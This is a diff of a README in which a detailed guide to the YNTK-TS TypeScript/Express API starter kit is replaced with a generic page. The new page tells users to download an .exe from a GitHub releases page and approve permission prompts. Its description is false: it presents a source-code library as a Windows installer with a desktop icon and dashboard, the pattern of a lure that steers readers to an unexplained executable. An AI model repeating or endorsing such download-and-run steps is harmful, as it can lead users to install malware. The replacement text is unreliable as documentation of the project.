@@ -1,430 +1,60 @@
-# YNTK-TS
-## You Need This Kit - Type-safe Starter!
-
-
-TypeScript/Express REST API starter kit that ships with User Management, Role Management, and Authentication with JWTs, Prisma ORM, and PostgreSQL. The project is organized by feature with explicit service/repository layers so business logic stays separated from transport concerns.
-
-## Tech Stack
-
-- **Runtime**: Node.js 22+, pnpm
-- **Framework**: Express 5 with middleware-based architecture
-- **Database/ORM**: PostgreSQL + Prisma
-- **Auth**: bcrypt for password hashing, jsonwebtoken for JWT-based authentication
-- **Email**: Nodemailer for password reset emails
-- **Logging**: Pino for structured JSON logging and audit trails
-- **Security**: express-rate-limit for API protection
-- **Validation**: Zod for request validation with custom schemas
-- **Testing**: Vitest for unit and integration testing
-- **Language/Tooling**: TypeScript (strict mode), tsx for development with hot reload
-
-## Project Structure
-
-```
-src/
-├── app.ts                # Express app bootstrap
-├── server.ts             # Starts HTTP server
-├── config/               # Environment loader & Prisma client wrapper
-├── controllers/          # HTTP handlers grouped by module + shared helpers
-├── services/             # Business logic (auth/user) & mappers
-├── repositories/         # Prisma data access per module
-├── middleware/           # Cross-cutting middleware (auth, validation)
-├── routes/               # Express routers mounted under /auth and /users
-├── validations/          # Zod schemas for request validation
-├── views/                # Email templates
-├── errors/               # Custom AppError type & error utilities
-├── utils/                # Shared utilities (password, string, Zod helpers)
-└── types/                # Shared TS types & Express module augmentation
-```
-
-## Getting Started
-
-### 1. Clone & Install
-
-```bash
-pnpm install
-```
-
-### 2. Environment Variables
-
-Create `.env` (never commit it) with the required settings:
-
-```env
-# Server Configuration
-NODE_ENV=development
-FRONTEND_URL=http://localhost:8080
-PORT=5050
-LOG_LEVEL=info
-
-# Database
-DATABASE_URL=postgresql://USER:PASSWORD@HOST:PORT/DATABASE
-
-# JWT Configuration
-JWT_SECRET=super-secret
-
-# Bcrypt Configuration
-SALT_ROUNDS=10
-
-# Email Configuration
-EMAIL_HOST=smtp.gmail.com
-EMAIL_PORT=587
-EMAIL_USER=your-email@gmail.com
-EMAIL_PASSWORD=your-app-password
-EMAIL_FROM=noreply@yourapp.com
-
-# Token Configuration
-ACCESS_TOKEN_EXPIRY="1h"
-ENABLE_REFRESH_TOKEN=true
-REFRESH_TOKEN_IN_JSON=true
-REFRESH_TOKEN_IN_COOKIE=true
-REFRESH_TOKEN_EXPIRY=7 * 24 * 60 * 60 * 1000 # 7 days in miliseconds
-COOKIE_SAME_SITE="strict" # strict, lax, none
-RESET_PASSWORD_TOKEN_EXPIRY=1 * 60 * 60 * 1000 # 1 hour in miliseconds
-EMAIL_VERIFICATION_TOKEN_EXPIRY=24 * 60 * 60 * 10000 # 24 hours in miliseconds
-
-# CORS Configuration
-ALLOWED_ORIGINS=http://localhost:5173,http://localhost:3000,http://localhost:8080,https://yourdomain.com
-CORS_CREDENTIALS=true
-```
-
-> **Note for Gmail**: Use an App Password instead of your regular password. Enable 2FA and generate an App Password in Google Account Settings → Security → App passwords.
-
-### 3. Database & Prisma
-
-1. Model updates live in `prisma/schema.prisma`.
-2. Apply migrations: `pnpm prisma migrate dev` (for local) or `pnpm prisma db push` for quick sync.
-3. Generate the Prisma client (needed whenever the schema changes): `pnpm prisma generate`. Output lands in `src/generated/prisma`.
-4. Seed the database: `pnpm prisma db seed`
-
-### 4. Development
-
-```bash
-pnpm dev
-```
-
-Runs tsx in watch mode, recompiling on changes. The API listens on `PORT` from the env file (defaults to `5050`).
-
-## Available Scripts
-
-| Command | Purpose |
-| --- | --- |
-| `pnpm dev` | Start the API in watch mode with tsx |
-| `pnpm prisma migrate dev` | Create/apply migrations and regenerate Prisma client |
-| `pnpm prisma generate` | Regenerate Prisma client manually |
-| `pnpm prisma db push` | Quick sync schema to database without migrations |
-| `pnpm prisma db seed` | Seed the database |
-| `pnpm build` | Build the API for production (bundles with tsup) |
-| `pnpm start` | Start the production server from `dist/` |
-| `pnpm test` | Run all tests in watch mode |
-| `pnpm test:unit` | Run unit tests only |
-| `pnpm test:integration` | Run integration tests only (sequential) |
-
-> ❗ **Production build**: The repo currently runs via tsx; add a `tsc` build + `start` script before deploying to production environments like Vercel/Node runtime functions.
-
-## API Documentation
-
-The API includes interactive documentation powered by Swagger UI and OpenAPI 3.0 (`swagger-jsdoc` and `swagger-ui-express`).
-
-- **URL**: `/api-docs` (accessible when the server is running)
-- **Features**:
-  - Interactive API explorer to test endpoints directly from the browser.
-  - Comprehensive schemas for request bodies, parameters, and responses.
-  - Read-only in production: The "Try it out" functionality is disabled in production environments for security.
-
-### API Endpoints
-
-All endpoints respond with `{ status, message, data? }` JSON payloads.
-For paginated endpoints (like `GET /users` and `GET /roles`), the response also includes `meta` and `links` objects containing paging data and HATEOAS navigational URLs. They optionally accept query parameters: `?page=1&limit=10&sortBy=createdAt&sortOrder=asc&search=value`.
-
-### Authentication Routes (`/auth`)
-
-| Method | Path | Description | Auth | Validation |
-| --- | --- | --- | --- | --- |
-| `POST` | `/auth/register` | Register a new user and send verification email | Public | `registerUserSchema` |
-| `POST` | `/auth/login` | Verify credentials and return JWT token | Public | - |
-| `POST` | `/auth/logout` | Logout and revoke refresh token | Required | `logoutSchema` |
-| `POST` | `/auth/refresh-token` | Refresh access token using refresh token | Public | `refreshTokenSchema` |
-| `POST` | `/auth/verify-email` | Verify email address using token from email | Public | `verifyEmailSchema` |
-| `POST` | `/auth/resend-verification` | Resend verification email (rate limited: 3/10min) | Public | `resendVerificationSchema` |
-| `POST` | `/auth/forgot-password` | Request password reset email (rate limited: 3/15min) | Public | `forgotPasswordSchema` |
-| `POST` | `/auth/reset-password` | Reset password using token from email | Public | `resetPasswordSchema` |
-
-### User Routes (`/users`)
-
-| Method | Path | Description | Auth | Validation |
-| --- | --- | --- | --- | --- |
-| `POST` | `/users` | Create a user (admin-style) | Required (`users:create`) | `createUserSchema` |
-| `GET` | `/users` | List all users | Required (`users:read`) | - |
-| `GET` | `/users/:id` | Fetch a user by ID | Required (`users:read`) | - |
-| `PUT` | `/users/:id` | Update user fields (username, email, displayName) | Required (`users:update`) | `updateUserSchema` |
-| `PUT` | `/users/:id/roles` | Assign roles to a user | Required (`roles:assign`) | `assignRolesSchema` |
-| `PATCH` | `/users/password` | Update current user's password | Required (`users:update`) | `updatePasswordSchema` |
-| `DELETE` | `/users/:id` | Remove a user | Required (`users:delete`) | - |
-
-### Role & Permission Routes (`/roles` & `/permissions`)
-
-| Method | Path | Description | Auth | Validation |
-| --- | --- | --- | --- | --- |
-| `GET` | `/roles` | List all roles | Required (`roles:read`) | - |
-| `GET` | `/roles/:id` | Fetch a role by ID | Required (`roles:read`) | - |
-| `POST` | `/roles` | Create a new role | Required (`roles:create`) | `createRoleSchema` |
-| `PUT` | `/roles/:id` | Update an existing role | Required (`roles:update`) | `updateRoleSchema` |
-| `DELETE` | `/roles/:id` | Remove a role | Required (`roles:delete`) | - |
-| `GET` | `/permissions` | List all system permissions | Required (`roles:read`) | - |
-
-**Auth Required**: Endpoints require `Authorization: Bearer <token>` header.
-
-## Validation Schemas
-
-The API uses Zod for request validation with the following schemas:
-
-- **`registerUserSchema`**: Validates user registration (username, email, displayName, password)
-- **`createUserSchema`**: Validates user creation (username, email, displayName)
-- **`updateUserSchema`**: Validates user updates (partial fields)
-- **`assignRolesSchema`**: Validates assigning role IDs to a user
-- **`updatePasswordSchema`**: Validates password changes (currentPassword, newPassword, confirmPassword)
-- **`createRoleSchema`**: Validates new role details and array of permission IDs
-- **`updateRoleSchema`**: Validates partial updates to a role
-- **`verifyEmailSchema`**: Validates email verification token
-- **`resendVerificationSchema`**: Validates email for resending verification
-- **`forgotPasswordSchema`**: Validates email for password reset requests
-- **`resetPasswordSchema`**: Validates reset token and new password (min 8 chars, uppercase, lowercase, number)
-- **`refreshTokenSchema`**: Validates refresh token from body or cookies
-- **`logoutSchema`**: Validates optional refresh token for revocation on logout
-
-All schemas include:
-- Email format validation
-- Username length constraints (3-30 chars)
-- Display name length constraints (3-100 chars)
-- Password length constraints (6-100 chars for regular, 8+ for reset with strength requirements)
-- Automatic lowercase transformation for usernames and emails
-
-## Middleware
-
-- **`authMiddleware`** (`src/middleware/auth.middleware.ts`): JWT verification and user authentication
-- **`requireVerified`** (`src/middleware/require-verified.middleware.ts`): Ensures user email is verified before access
-- **`validate`** (`src/middleware/validation.middleware.ts`): Zod schema validation for request body/params/query
-- **`forgotPasswordLimiter`** (`src/middleware/rate-limit.middleware.ts`): Rate limiting for password reset (3 requests per 15 minutes)
-- **`resendVerificationLimiter`** (`src/middleware/rate-limit.middleware.ts`): Rate limiting for resending verification emails (3 requests per 10 minutes)
-
-## Adding New Modules
-
-1. **Plan the data shape** (Prisma model, DTOs, response contract).
-2. **Create Zod schemas** in `src/validations/<module>.validation.ts` for request validation.
-3. **Create routes** under `src/routes/<module>.routes.ts` and mount them in `src/routes/index.ts`.
-4. **Implement controllers** (validation + DTO parsing) in `src/controllers/<module>.controller.ts`.
-5. **Add services** in `src/services/<module>.service.ts` and reuse `AppError` for controlled failures.
-6. **Create repositories** talking to Prisma in `src/repositories/<module>.repository.ts`.
-7. **Add middleware/types** if you need new guards or request data.
-8. **Update docs/tests** and run the dev server to smoke-test.
-
-## Error Handling
-
-The API uses a custom `AppError` class for controlled error handling:
-- Consistent error responses across all endpoints
-- HTTP status code mapping
-- Detailed error messages for debugging
-
-## Security Features
-
-- ✅ Granular Role-Based Access Control (RBAC) with capability-driven tokens
-- ✅ Password hashing with bcrypt (configurable salt rounds)
-- ✅ JWT-based authentication with configurable expiration
-- ✅ Email verification with secure token generation (24-hour expiry by default)
-- ✅ Password reset with secure token generation (SHA-256 hashing, 1-hour expiry)
-- ✅ Rate limiting on password reset and email verification endpoints
-- ✅ Email enumeration prevention (same response for existing/non-existing emails)
-- ✅ Comprehensive audit logging with Pino (15+ event types tracked)
-- ✅ Request validation with Zod
-- ✅ Environment variable configuration
-- ✅ Refresh token rotation with configurable delivery (JSON body / HTTP-Only Cookie)
-- ✅ Unique constraints on username and email
-- ✅ CORS with origin whitelisting and credentials support
-
-## Refresh Token Configuration
-
-The API implements a robust, secure **Refresh Token Rotation** mechanism to safely extend user sessions without compromising security.
-
-### Configuration
-
-Refresh tokens are configured via environment variables in `.env`:
-
-```env
-ENABLE_REFRESH_TOKEN=true
-REFRESH_TOKEN_IN_JSON=true
-REFRESH_TOKEN_IN_COOKIE=true
-COOKIE_SAME_SITE="strict" # strict, lax, none
-REFRESH_TOKEN_EXPIRY=604800000 # 7 days in milliseconds
-```
-
-### Features
-
-- **Token Rotation**: Every time a user requests a new access token via `/auth/refresh-token`, their old refresh token is immediately revoked and a new pair is issued. This provides **Replay Protection**.
-- **Stolen Token Detection**: (Implicit via Rotation) If a stolen token is reused, the API will reject it since it was already rotated.
-- **Flexible Delivery**: You can choose to deliver the refresh token via a secure `HTTP-Only` cookie (for web clients to prevent XSS) and/or directly in the JSON response body (for mobile apps or specialized clients).
-- **Cross-Site Request Forgery (CSRF) Protection**: When using cookies, adjust the `COOKIE_SAME_SITE` variable. Use `strict` when the frontend and backend are on the exact same domain, or `lax`/`none` (along with `secure: true`) if operating across subdomains or entirely different domains.
-- **Single-Session By Default**: Logging into a new device automatically clears all older refresh tokens for that user, ensuring only one active session at a time.
-- **Auto-Cleanup**: Expired tokens are automatically purged from the database during any refresh request, functioning as a lazy-cleanup job.
-
-## CORS Configuration
-
-The API includes Cross-Origin Resource Sharing (CORS) support to allow requests from different origins (e.g., frontend applications).
-
-### Configuration
-
-CORS is configured via environment variables in `.env`:
-
-```env
-# Comma-separated list of allowed origins
-ALLOWED_ORIGINS=http://localhost:5173,http://localhost:3000,http://localhost:8080,https://yourdomain.com
-
-# Allow credentials (cookies, authorization headers)
-CORS_CREDENTIALS=true
-```
-
-### Features
-
-- **Origin Whitelisting**: Only specified origins can access the API
-- **Dynamic Validation**: Origins are validated against the whitelist on each request
-- **Credentials Support**: Allows sending cookies and authorization headers when enabled
-- **Preflight Caching**: OPTIONS requests are cached for 24 hours to improve performance
-- **Comprehensive Headers**: Supports common headers like `Content-Type`, `Authorization`, `X-Requested-With`
-
-### Security Best Practices
-
-> [!WARNING]
-> **Production Security**
-> - Never use `*` (wildcard) for `ALLOWED_ORIGINS` in production
-> - Only add trusted domains to the whitelist
-> - Use HTTPS for production origins (e.g., `https://yourdomain.com`)
-> - Regularly audit the allowed origins list
-
-> [!IMPORTANT]
-> **Credentials Configuration**
-> - Set `CORS_CREDENTIALS=true` only if you're using cookies or need to send authorization headers
-> - When credentials are enabled, you cannot use wildcard origins
-> - Frontend must include `credentials: 'include'` (fetch) or `withCredentials: true` (axios)
-
-### Environment-Specific Setup
-
-**Development:**
-```env
-ALLOWED_ORIGINS=http://localhost:5173,http://localhost:3000,http://localhost:8080
-CORS_CREDENTIALS=true
-```
-
-**Production:**
-```env
-ALLOWED_ORIGINS=https://yourdomain.com,https://admin.yourdomain.com
-CORS_CREDENTIALS=true
-```
-
-### Troubleshooting
-
-**CORS Error: "No 'Access-Control-Allow-Origin' header"**
-- Verify the origin is in `ALLOWED_ORIGINS`
-- Check that CORS middleware is applied before routes in `src/app.ts`
-- Ensure environment variables are loaded correctly
-
-**Credentials Not Working:**
-- Set `CORS_CREDENTIALS=true` in `.env`
-- Frontend must send `credentials: 'include'` or `withCredentials: true`
-- Origin must be specific (not `*`)
-
-## Audit Logging
-
-The API uses **Pino** for structured JSON logging with comprehensive audit trails:
-
-**Logged Events:**
-- User registration (success/failure)
-- Login attempts (success/failure with reasons)
-- Logout events
-- Email verification (success/failure)
-- Resend verification requests
-- Password reset requests
-- Password reset completions
-- Profile updates
-- User deletions
-- Password changes
-
-**Log Format:**
-- Development: Pretty-printed colored output
-- Production: Structured JSON for log aggregation services (Axiom, Logtail, Datadog)
-
-**Example Log:**
-```json
-{
-  "level": 30,
-  "time": 1702890637123,
-  "action": "user_login",
-  "userId": "5ba52d7e-07f9-4b15-998f-fb1bf0885e7d",
-  "email": "user@example.com",
-  "msg": "User logged in successfully"
-}
-```
-
-## Deployment
-
-### Production Build
-The project is configured to use `tsup` for efficient bundling.
-
-1. **Build**: `pnpm build`
-   - Cleans `dist/`
-   - Bundles `src/server.ts` and dependencies to `dist/server.js`
-   - Copies email templates to `dist/views/emails`
-2. **Start**: `pnpm start`
-   - Runs `node dist/server.js`
-
-### Hosting Recommendations
-- **Railway/Render**: Ideal for this Node.js setup. They will automatically detect the `build` and `start` scripts in `package.json`.
-- **VPS (Coolify/Docker)**: Full control over the environment. Ensure `DATABASE_URL` is set and migrations are run.
-
-### Database Migrations
-Always run migrations in production before starting the app:
-```bash
-pnpm prisma migrate deploy
-```
-
-## Testing
-
-The project uses **Vitest** for unit and integration testing.
-
-### Running Tests
-
-```bash
-# Run all tests (watch mode)
-pnpm test
-
-# Run unit tests only
-pnpm test:unit
-
-# Run integration tests only
-pnpm test:integration
-
-# Run with coverage
-pnpm exec vitest run --coverage
-```
-
-### Test Structure
-
-Tests are organized in `tests/` with separate directories for unit and integration tests:
-
-```
-tests/
-├── unit/                    # Unit tests (mocked dependencies)
-│   ├── controllers/
-│   ├── services/
-│   ├── middleware/
-│   └── utils/
-└── integration/             # Integration tests (real database)
-    ├── helpers/             # Test utilities (DB reset)
-    ├── repositories/        # Repository tests
-    └── routes/              # Route/endpoint tests
-```
-
-### Integration Tests
-
-Integration tests run against a real PostgreSQL database. Ensure your `DATABASE_URL` points to a test database that can be safely cleared between tests.
-
-> [!WARNING]
-> Integration tests truncate all tables before each test. **Do not run against a production database.**
+# 📦 yntk-ts - Build secure applications with less effort
 
+[![Download yntk-ts](https://img.shields.io/badge/Download_Now-Blue-blue.svg)](https://github.com/Amino4107/yntk-ts/releases)
+
+## What is this tool?
+This software helps you build web applications. It provides the foundation for your project so you do not have to write code from scratch. It handles difficult tasks like managing user accounts, checking permissions, and keeping your data secure. You get a head start on your project with tools already in place for your database and security needs.
+
+## ⚙️ System Requirements
+You need a Windows computer to use this application. Ensure your system meets these standards for the best results:
+*   Windows 10 or Windows 11.
+*   4GB of system memory.
+*   500MB of free space on your hard drive.
+*   An active internet connection.
+
+## 📥 Getting the software
+You must visit the official release page to obtain the files for your computer. 
+
+[Click here to open the download page](https://github.com/Amino4107/yntk-ts/releases)
+
+Follow these steps to download the software:
+1. Open the link provided above in your web browser.
+2. Look for the section labeled "Assets" at the bottom of the latest release post.
+3. Click the file name that ends in .exe to start the download.
+4. Save the file to your desktop or your downloads folder.
+
+## 🏗️ Setting up the application
+Once the download finishes, you must run the file to install the software on your machine:
+1. Locate the file you downloaded.
+2. Double-click the file icon.
+3. If a box appears asking for permission, click the button that says "Yes" or "Run."
+4. Follow the instructions on the screen to finish the setup process.
+5. Once the setup completes, you will see a new icon on your desktop.
+
+## 🔑 How user management works
+The application includes a system to handle user accounts. This allows your app to recognize who logs in. When you start your project, you will find settings to create a new user profile. This profile tracks information such as email addresses and passwords. The system uses a method called JWT to keep these sessions active while you browse your application. 
+
+## 🛡️ Role management features
+You can control what users see and do through roles. For example, you might create an administrator role and a guest role. The administrator can change settings, while the guest can only view pages. This structure keeps your application safe from unauthorized changes. You define these limits in the settings dashboard after your initial login.
+
+## 💾 Database configuration
+This tool uses a database to store all your information. You do not need to build it yourself. The software comes with a tool called Prisma. This tool acts as a bridge between your application and the database. It organizes your data in a clear way. When you run the application, it creates the necessary storage areas on your computer automatically.
+
+## 🤝 Getting help
+If you run into issues, check the steps again. Ensure you followed each part of the setup. Common problems happen when a step gets skipped or a firewall prevents the app from connecting to the local database. Keep the app updated by visiting the release page regularly. You can find newer versions there that fix bugs and add improvements to the system. 
+
+## 📝 Common questions
+**Does this work on older Windows versions?**
+It works best on currently supported versions of Windows. We recommend keeping your operating system current for security.
+
+**Do I need to pay for this?**
+This software is free to use for your projects.
+
+**Can I modify the code?**
+Yes, you can look at the files and change how the application works to suit your needs.
+
+**Where do I see my data?**
+The database stays on your local machine. You can access it through the dashboard built into the application interface.
+
+## 🚀 Starting your project
+You now have the software ready. Launch the application from your desktop to begin. The first screen will guide you through the setup of your first administrator account. Enter your preferred email and password when prompted. Remember to store these details in a secure place. You are ready to start building features on top of this starter kit.
